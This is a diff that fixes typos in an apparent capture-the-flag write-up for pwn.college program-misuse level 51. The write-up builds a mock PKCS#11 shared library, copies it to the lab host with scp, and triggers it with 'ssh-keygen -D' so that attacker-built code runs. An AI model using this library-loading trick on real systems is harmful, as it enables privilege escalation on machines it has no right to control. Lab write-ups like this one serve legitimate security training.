@@ -132,12 +132,12 @@ CK_DEFINE_FUNCTION(CK_RV, C_Initialize)(CK_VOID_PTR pInitArgs)
 }
 ```
 
-Then run `build/linux/build.sh` to build our `pkcs11-mock.so` and transfer it to our ssh target remote connection with `scp`.
+Then run `build/linux/build.sh` to build our `pkcs11-mock.so` and transfer it to our target ssh remote connection with `scp`.
 ```bash
 $ scp -i key -r pkcs11-mock-x64.so hacker@dojo.pwn.college:/home/hacker/
 ```
 
-Run the the exploit to the target machine with 
+Run the exploit to the target machine with 
 ```
 hacker@program-misuse-level-51:~$ ssh-keygen -D ./pkcs11-mock-x64.so 
 [pkcs11-mock by relro for pwn.college level 51 HARDDDDDDD]
